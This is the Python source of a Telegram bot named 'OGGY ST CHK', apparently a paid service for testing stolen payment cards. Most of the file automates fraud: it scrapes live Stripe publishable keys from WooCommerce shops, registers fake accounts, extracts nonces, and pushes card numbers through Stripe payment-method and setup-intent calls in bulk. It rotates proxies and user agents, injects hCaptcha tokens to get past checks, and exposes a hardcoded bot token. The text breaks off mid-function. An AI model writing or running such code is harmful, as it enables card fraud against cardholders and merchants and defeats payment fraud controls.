# bot.py
# OGGY ST CHK — Telegram bot
# Owner: 8919487892

import asyncio
import html
import io
import logging
import os
import random
import re
import socket
import sqlite3
import string
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from itertools import cycle
from typing import Optional
from urllib.parse import quote

import requests
from fake_useragent import UserAgent

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
    ApplicationHandlerStop,
)

# ===================== CONFIG =====================
BOT_TOKEN = "8593907353:AAE6Uh02Rhm8KWUI3aqYy1IfAs3dZHHhljk"
OWNER_ID = 8919487892
BOT_NAME = "OGGY ST CHK"
DB_PATH = "oggy.db"

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", level=logging.INFO)
logger = logging.getLogger("oggy")
logging.getLogger("httpx").setLevel(logging.WARNING)

socket.setdefaulttimeout(20)

# ===================== DB =====================
def db() -> sqlite3.Connection:
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

def init_db():
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id      INTEGER PRIMARY KEY,
            username     TEXT,
            first_seen   INTEGER,
            expiry_ts    INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS keys (
            key         TEXT PRIMARY KEY,
            duration_s  INTEGER,
            created_by  INTEGER,
            created_at  INTEGER,
            used_by     INTEGER DEFAULT NULL,
            used_at     INTEGER DEFAULT NULL
        );
        CREATE TABLE IF NOT EXISTS admins (
            user_id     INTEGER PRIMARY KEY,
            added_by    INTEGER,
            added_at    INTEGER
        );
        CREATE TABLE IF NOT EXISTS config (
            k TEXT PRIMARY KEY,
            v TEXT
        );
        CREATE TABLE IF NOT EXISTS charges (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id     INTEGER,
            card        TEXT,
            response    TEXT,
            ts          INTEGER
        );
        """)
        cols = [r["name"] for r in c.execute("PRAGMA table_info(users)").fetchall()]
        if "banned" not in cols:
            c.execute("ALTER TABLE users ADD COLUMN banned INTEGER DEFAULT 0")
        if "ban_reason" not in cols:
            c.execute("ALTER TABLE users ADD COLUMN ban_reason TEXT DEFAULT ''")

def cfg_get(k, default=None):
    with db() as c:
        row = c.execute("SELECT v FROM config WHERE k=?", (k,)).fetchone()
        return row["v"] if row else default

def cfg_set(k, v):
    with db() as c:
        c.execute("INSERT INTO config(k,v) VALUES(?,?) ON CONFLICT(k) DO UPDATE SET v=excluded.v",
                  (k, str(v)))

def user_ensure(uid, username=""):
    with db() as c:
        c.execute("INSERT INTO users(user_id, username, first_seen) VALUES(?,?,?) "
                  "ON CONFLICT(user_id) DO UPDATE SET username=excluded.username",
                  (uid, username or "", int(time.time())))

def user_get(uid):
    with db() as c:
        return c.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()

def user_add_time(uid, seconds):
    with db() as c:
        row = c.execute("SELECT expiry_ts FROM users WHERE user_id=?", (uid,)).fetchone()
        now = int(time.time())
        base = row["expiry_ts"] if row and row["expiry_ts"] > now else now
        c.execute("UPDATE users SET expiry_ts=? WHERE user_id=?", (base + seconds, uid))

def user_revoke(uid):
    with db() as c:
        r = c.execute("SELECT 1 FROM users WHERE user_id=?", (uid,)).fetchone()
        if not r: return False
        c.execute("UPDATE users SET expiry_ts=0 WHERE user_id=?", (uid,))
    return True

def user_ban(uid, reason=""):
    with db() as c:
        r = c.execute("SELECT 1 FROM users WHERE user_id=?", (uid,)).fetchone()
        if not r: return False
        c.execute("UPDATE users SET banned=1, ban_reason=? WHERE user_id=?", (reason, uid))
    return True

def user_unban(uid):
    with db() as c:
        c.execute("UPDATE users SET banned=0, ban_reason='' WHERE user_id=?", (uid,))
    return True

def user_is_banned(uid):
    if uid == OWNER_ID: return False
    row = user_get(uid)
    return bool(row and row["banned"])

def user_is_admin(uid):
    if uid == OWNER_ID: return True
    with db() as c:
        return c.execute("SELECT 1 FROM admins WHERE user_id=?", (uid,)).fetchone() is not None

def user_has_plan(uid):
    if uid == OWNER_ID or user_is_admin(uid): return True
    if user_is_banned(uid): return False
    row = user_get(uid)
    return bool(row and row["expiry_ts"] and row["expiry_ts"] > int(time.time()))

def key_generate(count, duration_s, created_by):
    out = []
    with db() as c:
        for _ in range(count):
            for _try in range(30):
                k = "OGGY-PROO-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
                if not c.execute("SELECT 1 FROM keys WHERE key=?", (k,)).fetchone():
                    c.execute("INSERT INTO keys(key,duration_s,created_by,created_at) VALUES(?,?,?,?)",
                              (k, duration_s, created_by, int(time.time())))
                    out.append(k); break
    return out

def key_redeem(k, uid):
    k = k.strip().upper()
    with db() as c:
        row = c.execute("SELECT * FROM keys WHERE key=?", (k,)).fetchone()
        if not row: return False, "❌ Invalid key."
        if row["used_by"] is not None: return False, "❌ Key already used."
        c.execute("UPDATE keys SET used_by=?, used_at=? WHERE key=?",
                  (uid, int(time.time()), k))
    user_add_time(uid, row["duration_s"])
    return True, f"✅ Redeemed — +{fmt_duration(row['duration_s'])} added."

def fmt_duration(s):
    d, h, m = s // 86400, (s % 86400) // 3600, (s % 3600) // 60
    p = []
    if d: p.append(f"{d}d")
    if h: p.append(f"{h}h")
    if m and not d: p.append(f"{m}m")
    if not p: p.append(f"{s}s")
    return "".join(p)

def parse_duration(s):
    s = s.strip().lower()
    m = re.match(r"^(\d+)\s*(s|m|h|d|w|mo)$", s)
    if not m: return None
    n, u = int(m.group(1)), m.group(2)
    return n * {"s":1,"m":60,"h":3600,"d":86400,"w":604800,"mo":2592000}[u]

# ===================== STATE =====================
USER_STATE = {}
PROXY_CYCLE = {"pool": [], "iter": None}
PK_CYCLE = {"pool": [], "iter": None}

def get_state(uid):
    if uid not in USER_STATE:
        USER_STATE[uid] = {
            "pending": None,
            "pending_cards": [],
            "pending_mode": "mass",       # mass | stauth | st05
            "pending_key_count": 0,
            "mass_running": False,
            "mass_chat_id": None,
            "mass_msg_id": None,
            "mass_done": 0, "mass_total": 0,
            "mass_approved": 0, "mass_declined": 0, "mass_threed": 0,
            "mass_approved_list": [],
            "mass_threed_list": [],
            "mass_declined_list": [],
            "mass_error_list": [],
        }
    return USER_STATE[uid]

def load_proxy_pool():
    raw = cfg_get("proxies", "") or ""
    pool = [parse_proxy_format(p) for p in raw.splitlines() if p.strip()]
    pool = [p for p in pool if p]
    PROXY_CYCLE["pool"] = pool
    PROXY_CYCLE["iter"] = cycle(pool) if pool else None

def load_pk_pool():
    raw = cfg_get("pk_keys", "") or ""
    pool = [k.strip() for k in raw.splitlines() if k.strip().startswith("pk_live_")]
    PK_CYCLE["pool"] = pool
    PK_CYCLE["iter"] = cycle(pool) if pool else None

def next_proxy():
    if not PROXY_CYCLE["iter"]: return None
    return next(PROXY_CYCLE["iter"])

def next_pk():
    if not PK_CYCLE["iter"]: return None
    return next(PK_CYCLE["iter"])

# ===================== AUTH =====================
async def _deny(update, msg):
    if update.callback_query:
        await update.callback_query.answer(msg, show_alert=True)
    elif update.effective_message:
        await update.effective_message.reply_text(msg)

def owner_only(fn):
    async def w(update, ctx):
        u = update.effective_user
        if not u or u.id != OWNER_ID:
            await _deny(update, "👑 Owner only."); return
        return await fn(update, ctx)
    return w

def admin_only(fn):
    async def w(update, ctx):
        u = update.effective_user
        if not u or not user_is_admin(u.id):
            await _deny(update, "🛠 Admins only."); return
        return await fn(update, ctx)
    return w

def plan_required(fn):
    async def w(update, ctx):
        u = update.effective_user
        if not u: return
        user_ensure(u.id, u.username or "")
        if user_is_banned(u.id):
            await _deny(update, "🚫 You are banned."); return
        if not user_has_plan(u.id):
            if update.callback_query:
                await update.callback_query.answer("No active plan.", show_alert=True)
            else:
                await update.effective_message.reply_text(
                    "🚫 <b>No active plan</b>\n\nRedeem: <code>/redeem OGGY-PROO-XXXX</code>",
                    parse_mode=ParseMode.HTML)
            return
        return await fn(update, ctx)
    return w

async def banned_guard(update, ctx):
    u = update.effective_user
    if u and user_is_banned(u.id):
        if update.callback_query:
            await update.callback_query.answer("🚫 You are banned.", show_alert=True)
        elif update.effective_message:
            row = user_get(u.id)
            reason = (row["ban_reason"] if row else "") or "no reason"
            await update.effective_message.reply_text(
                f"🚫 <b>You are banned.</b>\nReason: <i>{html.escape(reason)}</i>",
                parse_mode=ParseMode.HTML)
        raise ApplicationHandlerStop

# ===================== PROXY UTILS =====================
PROXY_RE = re.compile(
    r"""^
    (?:(?P<scheme>\w+)://)?
    (?:(?P<user1>[^:@\s]+):(?P<pass1>[^:@\s]+)@)?
    (?P<host>[\w.\-]+):(?P<port>\d{2,5})
    (?::(?P<user2>[^:\s]+):(?P<pass2>[^:\s]+))?
    $""",
    re.VERBOSE,
)

def parse_proxy_format(line):
    if not line: return None
    line = line.strip()
    if not line or line.startswith("#"): return None
    m = PROXY_RE.match(line)
    if not m:
        return None
    d = m.groupdict()
    host, port = d["host"], d["port"]
    user = d.get("user1") or d.get("user2")
    pwd = d.get("pass1") or d.get("pass2")
    scheme = d.get("scheme") or "http"
    if user and pwd:
        url = f"{scheme}://{user}:{pwd}@{host}:{port}"
    else:
        url = f"{scheme}://{host}:{port}"
    return {"http": url, "https": url, "original": line, "host": host, "port": port,
            "scheme": scheme, "user": user, "pass": pwd}

def test_proxy_live(pd, timeout=8):
    try:
        r = requests.get("http://www.google.com/generate_204",
                         proxies={"http": pd["http"], "https": pd["https"]},
                         timeout=timeout, allow_redirects=False)
        if r.status_code in (200, 204):
            return True, "ok"
        return False, f"status {r.status_code}"
    except Exception as e:
        return False, str(e)[:80]

def proxy_check_bulk(proxy_lines, workers=50):
    parsed = [parse_proxy_format(l) for l in proxy_lines]
    parsed = [p for p in parsed if p]
    live, dead = [], []
    if not parsed:
        return live, dead
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futs = {pool.submit(test_proxy_live, p): p for p in parsed}
        for fut in as_completed(futs):
            p = futs[fut]
            try:
                ok, _ = fut.result()
                (live if ok else dead).append(p)
            except Exception:
                dead.append(p)
    return live, dead

# ===================== STRIPE ENGINE =====================
def get_stripe_key(domain, proxy_dict=None):
    urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params",
    ]
    patterns = [
        r"pk_live_[a-zA-Z0-9_]+",
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]',
    ]
    for url in urls:
        try:
            r = requests.get(url, headers={"User-Agent": UserAgent().random},
                             timeout=10, verify=False, proxies=proxy_dict)
            if r.status_code == 200:
                for pat in patterns:
                    m = re.search(pat, r.text)
                    if m:
                        km = re.search(r"pk_live_[a-zA-Z0-9_]+", m.group(0))
                        if km: return km.group(0)
        except Exception:
            continue
    return None

def extract_nonce_from_page(body, domain):
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
    ]
    for p in patterns:
        m = re.search(p, body)
        if m: return m.group(1)
    return None

def _gen_creds():
    u = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return u, f"{u}@gmail.com", "".join(random.choices(string.ascii_letters + string.digits, k=12))

def register_account(domain, session, proxy_dict=None):
    try:
        r = session.get(f"https://{domain}/my-account/", verify=False, proxies=proxy_dict)
        nonce = None
        for pat in (r'name="woocommerce-register-nonce" value="([^"]+)"',
                    r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
                    r'register-nonce["\']?:\s*["\']([^"\']+)["\']'):
            m = re.search(pat, r.text)
            if m: nonce = m.group(1); break
        if not nonce: return False
        u_, e, p = _gen_creds()
        session.post(f"https://{domain}/my-account/",
                     data={"username": u_, "email": e, "password": p,
                           "woocommerce-register-nonce": nonce,
                           "_wp_http_referer": "/my-account/", "register": "Register"},
                     headers={"Referer": f"https://{domain}/my-account/"},
                     verify=False, proxies=proxy_dict)
        return True
    except Exception:
        return False

def process_card_enhanced(domain, ccx, proxy_dict=None, pk_override=None, hcaptcha=None):
    """Core engine — used by /st, /mass, /stauth, /st0.5."""
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {"Response": "Invalid card format", "Status": "Declined"}
    if "20" in yy: yy = yy.split("20")[1]

    ua = UserAgent().random
    mid = str(uuid.uuid4()); sid = str(uuid.uuid4()) + str(int(time.time()))

    session = requests.Session(); session.headers.update({"User-Agent": ua})

    if pk_override:
        pk = pk_override
    elif domain:
        pk = get_stripe_key(domain, proxy_dict)
    else:
        pk = None
    if not pk:
        return {"Response": "No pk_live available", "Status": "Declined"}

    # if we have a pk but no domain → pure pk mode (skip nonce/setup intent)
    if not domain:
        return _pk_only_flow(n, mm, yy, cvc, pk, ua, mid, sid, proxy_dict, hcaptcha)

    register_account(domain, session, proxy_dict)

    nonce = None
    for url in (f"https://{domain}/my-account/add-payment-method/",
                f"https://{domain}/checkout/",
                f"https://{domain}/my-account/"):
        try:
            r = session.get(url, timeout=10, verify=False, proxies=proxy_dict)
            if r.status_code == 200:
                nonce = extract_nonce_from_page(r.text, domain)
                if nonce: break
        except Exception:
            continue
    if not nonce:
        return {"Response": "No nonce found", "Status": "Declined"}

    pm_data = _build_pm_data(n, mm, yy, cvc, pk, ua, mid, sid, domain, hcaptcha)
    try:
        pm = requests.post("https://api.stripe.com/v1/payment_methods", data=pm_data,
                           headers={"User-Agent": ua, "accept": "application/json",
                                    "content-type": "application/x-www-form-urlencoded",
                                    "origin": "https://js.stripe.com",
                                    "referer": "https://js.stripe.com/"},
                           timeout=15, verify=False, proxies=proxy_dict)
        pmj = pm.json()
        if "id" not in pmj:
            return {"Response": pmj.get("error", {}).get("message", "PM error"), "Status": "Declined"}
        pm_id = pmj["id"]
    except Exception as e:
        return {"Response": f"PM failed: {e}", "Status": "Declined"}

    endpoints = [
        {"url": f"https://{domain}/", "params": {"wc-ajax": "wc_stripe_create_and_confirm_setup_intent"}},
        {"url": f"https://{domain}/wp-admin/admin-ajax.php", "params": {}},
        {"url": f"https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", "params": {}},
    ]
    payloads = [
        {"action": "wc_stripe_create_and_confirm_setup_intent",
         "wc-stripe-payment-method": pm_id, "wc-stripe-payment-type": "card", "_ajax_nonce": nonce},
        {"action": "wc_stripe_create_setup_intent",
         "payment_method_id": pm_id, "_wpnonce": nonce},
    ]
    for ep in endpoints:
        for pl in payloads:
            try:
                r = session.post(ep["url"], params=ep.get("params", {}), data=pl,
                                 headers={"User-Agent": ua,
                                          "Referer": f"https://{domain}/my-account/add-payment-method/",
                                          "accept": "*/*",
                                          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                          "origin": f"https://{domain}", "x-requested-with": "XMLHttpRequest"},
                                 timeout=15, verify=False, proxies=proxy_dict)
                try: sd = r.json()
                except Exception: sd = {"raw_response": r.text}
                if sd.get("success"):
                    st = sd["data"].get("status")
                    if st == "requires_action": return {"Response": "3D", "Status": "Declined"}
                    if st == "succeeded": return {"Response": "Card Added", "Status": "Approved"}
                    if "error" in sd["data"]:
                        return {"Response": sd["data"]["error"].get("message", "err"), "Status": "Declined"}
                if not sd.get("success") and isinstance(sd.get("data"), dict) and "error" in sd["data"]:
                    return {"Response": sd["data"]["error"].get("message", "err"), "Status": "Declined"}
                if sd.get("status") in ("succeeded", "success"):
                    return {"Response": "Card Added", "Status": "Approved"}
            except Exception:
                continue
    return {"Response": "All attempts failed", "Status": "Declined"}

def _build_pm_data(n, mm, yy, cvc, pk, ua, mid, sid, domain, hcaptcha=None):
    data = {
        "type": "card",
        "card[number]": n, "card[cvc]": cvc,
        "card[exp_year]": yy, "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "billing_details[address][country]": "US",
        "billing_details[address][postal_code]": "10080",
        "billing_details[name]": "Sahil Pro",
        "pasted_fields": "number",
        "payment_user_agent": f"stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent",
        "referrer": f"https://{domain}" if domain else "https://js.stripe.com",
        "time_on_page": str(int(time.time()) % 100000),
        "key": pk,
        "_stripe_version": "2024-06-20",
        "guid": str(uuid.uuid4()),
        "muid": mid, "sid": sid,
    }
    if hcaptcha:
        data["radar_options[hcaptcha_token]"] = hcaptcha
    return data

def _pk_only_flow(n, mm, yy, cvc, pk, ua, mid, sid, proxy_dict, hcaptcha=None):
    """Pure pk mode: create payment method, no site."""
    data = _build_pm_data(n, mm, yy, cvc, pk, ua, mid, sid, None, hcaptcha)
    try:
        pm = requests.post("https://api.stripe.com/v1/payment_methods", data=data,
                           headers={"User-Agent": ua, "accept": "application/json",
                                    "content-type": "application/x-www-form-urlencoded",
                                    "origin": "https://js.stripe.com",
                                    "referer": "https://js.stripe.com/"},
                           timeout=15, verify=False, proxies=proxy_dict)
        pmj = pm.json()
        if "id" in pmj:
            return {"Response": "Auth Passed (pk-only)", "Status": "Approved"}
        err = pmj.get("error", {}).get("message", "Declined")
        return {"Response": err, "Status": "Declined"}
    except Exception as e:
        return {"Response": f"PM failed: {e}", "Status": "Declined"}

# ===================== UI =====================
def now_ts(): return int(time.time())

def fmt_user(u):
    exp = u["expiry_ts"] or 0
    banned = u["banned"] if "banned" in u.keys() else 0
    if u["user_id"] == OWNER_ID: plan = "👑 OWNER"
    elif user_is_admin(u["user_id"]): plan = "🛠 ADMIN"
    elif banned: plan = "🚫 BANNED"
    elif exp > now_ts(): plan = f"💎 {fmt_duration(exp-now_ts())}"
    else: plan = "❌ none"
    uname = f"@{u['username']}" if u["username"] else "—"
    return f"<code>{u['user_id']}</code> · {uname} · {plan}"

CARD_LINE_RE = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
PK_LINE_RE = re.compile(r"^pk_live_[A-Za-z0-9_]+$")

def parse_cards_from_text(t):
    return [l.strip() for l in t.splitlines() if CARD_LINE_RE.match(l.strip())]

def parse_pks_from_text(t):
    return [l.strip() for l in t.splitlines() if PK_LINE_RE.match(l.strip())]

async def edit_or_reply(update, text, kb=None):
    if update.callback_query:
        try:
            await update.callback_query.edit_message_text(
                text, parse_mode=ParseMode.HTML, reply_markup=kb,
                disable_web_page_preview=True)
        except Exception:
            await update.callback_query.message.reply_text(
                text, parse_mode=ParseMode.HTML, reply_markup=kb,
                disable_web_page_preview=True)
    else:
        await update.effective_message.reply_text(
            text, parse_mode=ParseMode.HTML, reply_markup=kb,
            disable_web_page_preview=True)

async def send_to_gc(bot, text, kb=None):
    """GC if set, else owner DM."""
    gid = cfg_get("gc_id", "") or ""
    target = None
    if gid:
        try: target = int(gid)
        except ValueError: target = None
    if target is None:
        target = OWNER_ID
    try:
        await bot.send_message(target, text, parse_mode=ParseMode.HTML,
                               reply_markup=kb, disable_web_page_preview=True)
    except Exception as e:
        logger.warning(f"GC send failed: {e}")

# ===================== KEYBOARDS =====================
def main_menu(is_admin=False, is_owner=False):
    rows = [
        [InlineKeyboardButton("💳 Single Check", callback_data="u:single_hint"),
         InlineKeyboardButton("⚡ Bulk Check", callback_data="u:bulk_hint")],
        [InlineKeyboardButton("🔐 Stripe Auth", callback_data="u:stauth_hint"),
         InlineKeyboardButton("💥 0.5$ Charge", callback_data="u:st05_hint")],
        [InlineKeyboardButton("🌐 PK Extractor", callback_data="u:key_hint"),
         InlineKeyboardButton("🔑 Redeem Key", callback_data="u:redeem_hint")],
        [InlineKeyboardButton("👤 My Plan", callback_data="u:me"),
         InlineKeyboardButton("📖 Help", callback_data="u:help")],
    ]
    if is_admin or is_owner:
        rows.append([InlineKeyboardButton("🛠  ADMIN PANEL  🛠", callback_data="a:panel")])
    return InlineKeyboardMarkup(rows)

def admin_panel_kb(is_owner=False):
    rows = [
        [InlineKeyboardButton("🔑 Gen Keys", callback_data="a:genkeys"),
         InlineKeyboardButton("📣 Broadcast", callback_data="a:broadcast")],
        [InlineKeyboardButton("👥 Users", callback_data="a:users"),
         InlineKeyboardButton("📊 Stats", callback_data="a:stats")],
        [InlineKeyboardButton("🗝 Unused Keys", callback_data="a:unused"),
         InlineKeyboardButton("🚫 Banned List", callback_data="a:banned")],
    ]
    if is_owner:
        rows.append([InlineKeyboardButton("👑 ─── ADMIN MGMT ─── 👑", callback_data="o:admins")])
        rows.append([InlineKeyboardButton("📥 Set GC", callback_data="o:setgc"),
                     InlineKeyboardButton("👁 View GC", callback_data="o:getgc")])
        rows.append([InlineKeyboardButton("💾 Recent Charges", callback_data="o:charges"),
                     InlineKeyboardButton("🌐 Target Site", callback_data="o:site_hint")])
        rows.append([InlineKeyboardButton("🧦 Proxies", callback_data="o:proxies"),
                     InlineKeyboardButton("🔑 PK Keys", callback_data="o:pks")])
        rows.append([InlineKeyboardButton("🛡 HCAPTCHA", callback_data="o:hcap"),
                     InlineKeyboardButton("⚙️ Auth/05 Sites", callback_data="o:authsites")])
    rows.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu:home")])
    return InlineKeyboardMarkup(rows)

def admin_mgmt_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Admin", callback_data="o:addadmin"),
         InlineKeyboardButton("➖ Remove Admin", callback_data="o:deladmin")],
        [InlineKeyboardButton("📋 List Admins", callback_data="o:listadmins")],
        [InlineKeyboardButton("« Back", callback_data="a:panel")],
    ])

def proxies_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Bulk Add", callback_data="o:proxies_add"),
         InlineKeyboardButton("🧪 Test All", callback_data="o:proxies_test")],
        [InlineKeyboardButton("🗑 Clear", callback_data="o:proxies_clear"),
         InlineKeyboardButton("📋 Show Sample", callback_data="o:proxies_show")],
        [InlineKeyboardButton("« Back", callback_data="a:panel")],
    ])

def pks_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Bulk Add", callback_data="o:pks_add"),
         InlineKeyboardButton("🗑 Clear", callback_data="o:pks_clear")],
        [InlineKeyboardButton("📋 Show Sample", callback_data="o:pks_show")],
        [InlineKeyboardButton("« Back", callback_data="a:panel")],
    ])

def back_main_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="menu:home")]])

def start_button_kb(count, mode="mass"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"▶️  START  ({count} cards · {mode})",
                              callback_data=f"m:start:{mode}")],
        [InlineKeyboardButton("🗑  Clear", callback_data="m:clear")],
    ])

def running_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🛑  STOP", callback_data="m:stop")]])

# ===================== USER COMMANDS =====================
async def cmd_start(update, ctx):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    is_admin = user_is_admin(u.id); is_owner = u.id == OWNER_ID
    row = user_get(u.id)
    exp = row["expiry_ts"] or 0
    if is_owner: plan = "👑 Owner"
    elif is_admin: plan = "🛠 Admin"
    elif exp > now_ts(): plan = f"💎 Active — {fmt_duration(exp-now_ts())} left"
    else: plan = "❌ No active plan"
    txt = (
        f"╔══════════════════════════╗\n"
        f"   🤖  <b>{BOT_NAME}</b>  🤖\n"
        f"╚══════════════════════════╝\n\n"
        f"👤 Plan: <b>{plan}</b>\n\n"
        f"━━━━━━━━━  ⚙️ COMMANDS  ━━━━━━━━━\n"
        f"💳 <code>/st cc|mm|yy|cvv</code> — site check\n"
        f"🔐 <code>/stauth cc|mm|yy|cvv</code> — auth check\n"
        f"💥 <code>/st0.5 cc|mm|yy|cvv</code> — 0.5$ charge\n"
        f"⚡ <code>/mass</code> — bulk check\n"
        f"🌐 <code>/key N</code> — extract pk_live keys\n"
        f"🧦 <code>/check</code> — proxy checker\n"
        f"🔑 <code>/redeem OGGY-PROO-XXXX</code>\n"
        f"👤 <code>/me</code> · 📖 <code>/help</code>"
    )
    await update.effective_message.reply_text(
        txt, parse_mode=ParseMode.HTML,
        reply_markup=main_menu(is_admin=is_admin, is_owner=is_owner))

async def cmd_help(update, ctx):
    u = update.effective_user
    is_admin = user_is_admin(u.id); is_owner = u.id == OWNER_ID
    txt = (
        f"📖 <b>{BOT_NAME} — Help</b>\n\n"
        f"━━━━  👤 USER  ━━━━\n"
        f"💳 <code>/st 4111111111111111|12|25|123</code>\n"
        f"🔐 <code>/stauth cc|mm|yy|cvv</code> — Stripe auth\n"
        f"💥 <code>/st0.5 cc|mm|yy|cvv</code> — 0.5$ charge\n"
        f"⚡ <code>/mass</code> — reply .txt / paste cards\n"
        f"🌐 <code>/key 5</code> — extract pk_live keys\n"
        f"🧦 <code>/check</code> — reply to .txt to test proxies\n"
        f"🔑 <code>/redeem OGGY-PROO-XXXX</code>\n"
        f"👤 <code>/me</code>"
    )
    if is_admin or is_owner:
        txt += (
            f"\n\n━━━━  🛠 ADMIN  ━━━━\n"
            f"🔑 <code>/genkey &lt;count&gt; &lt;dur&gt;</code>\n"
            f"📣 <code>/broadcast &lt;text&gt;</code>\n"
            f"👥 <code>/users</code> · 📊 <code>/stats</code>\n"
            f"🚫 <code>/ban &lt;id&gt; [reason]</code>\n"
            f"✅ <code>/unban &lt;id&gt;</code>\n"
            f"♻️ <code>/revoke &lt;id&gt;</code>\n"
            f"🚫 <code>/banned</code>"
        )
    if is_owner:
        txt += (
            f"\n\n━━━━  👑 OWNER  ━━━━\n"
            f"➕ <code>/addadmin &lt;id&gt;</code> · ➖ <code>/deladmin &lt;id&gt;</code>\n"
            f"📥 <code>/setgc -100...</code> · 👁 <code>/getgc</code>\n"
            f"🌐 <code>/setsite domain.com</code> · <code>/sites</code>\n"
            f"🔐 <code>/setauthsite domain.com</code>\n"
            f"💥 <code>/set05site domain.com</code>\n"
            f"🧦 <code>/setproxies</code> · <code>/clearproxies</code> · <code>/getproxies</code>\n"
            f"🔑 <code>/setpks</code> · <code>/clearpks</code> · <code>/getpks</code>\n"
            f"🛡 <code>/sethcaptcha &lt;token&gt;</code> · <code>/clearhcaptcha</code>\n"
            f"💾 <code>/charges [N]</code>"
        )
    await edit_or_reply(update, txt, main_menu(is_admin=is_admin, is_owner=is_owner))

async def cmd_me(update, ctx):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    row = user_get(u.id)
    exp = row["expiry_ts"] or 0
    banned = row["banned"] if "banned" in row.keys() else 0
    if u.id == OWNER_ID: plan = "👑 <b>OWNER</b>"
    elif user_is_admin(u.id): plan = "🛠 <b>ADMIN</b>"
    elif banned: plan = "🚫 <b>BANNED</b>"
    elif exp > now_ts(): plan = f"💎 <b>Active</b> — {fmt_duration(exp-now_ts())} left"
    else: plan = "❌ <b>None</b>"
    txt = (
        f"╭─ 👤  <b>PROFILE</b>\n"
        f"│\n"
        f"├ 🆔 <code>{row['user_id']}</code>\n"
        f"├ 📛 @{row['username'] or '—'}\n"
        f"├ 🔍 Checks: <b>{row['total_checks']}</b>\n"
        f"╰ 💠 {plan}"
    )
    await edit_or_reply(update, txt, back_main_kb())

async def cmd_redeem(update, ctx):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    if user_is_banned(u.id):
        await update.effective_message.reply_text("🚫 Banned."); return
    if not ctx.args:
        await update.effective_message.reply_text("🔑 <code>/redeem OGGY-PROO-XXXX</code>",
                                                  parse_mode=ParseMode.HTML); return
    if u.id != OWNER_ID and not user_is_admin(u.id):
        row = user_get(u.id)
        if row and row["expiry_ts"] and row["expiry_ts"] > now_ts():
            left = fmt_duration(row["expiry_ts"] - now_ts())
            await update.effective_message.reply_text(
                f"⏳ <b>You already have an active plan.</b>\n💎 {left} remaining.",
                parse_mode=ParseMode.HTML); return
    ok, msg = key_redeem(ctx.args[0], u.id)
    await update.effective_message.reply_text(msg, parse_mode=ParseMode.HTML)

# --- single check (site) ---
@plan_required
async def cmd_single(update, ctx):
    u = update.effective_user
    if not ctx.args:
        await update.effective_message.reply_text("💳 <code>/st N|MM|YY|CVV</code>",
                                                  parse_mode=ParseMode.HTML); return
    cc = ctx.args[0].strip()
    if not CARD_LINE_RE.match(cc):
        await update.effective_message.reply_text("❌ Invalid format."); return
    site = (cfg_get("working_sites", "") or "").split(",")[0].strip()
    proxy = next_proxy(); pk = next_pk()
    hcap = cfg_get("hcaptcha_token", "") or None
    msg = await update.effective_message.reply_text("⏳ <b>Checking…</b>", parse_mode=ParseMode.HTML)
    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(None, process_card_enhanced, site, cc, proxy, pk, hcap)
    await _handle_single_result(update, ctx, cc, res, site, mode="ST")

# --- single auth ---
@plan_required
async def cmd_stauth(update, ctx):
    u = update.effective_user
    if not ctx.args:
        await update.effective_message.reply_text("🔐 <code>/stauth N|MM|YY|CVV</code>",
                                                  parse_mode=ParseMode.HTML); return
    cc = ctx.args[0].strip()
    if not CARD_LINE_RE.match(cc):
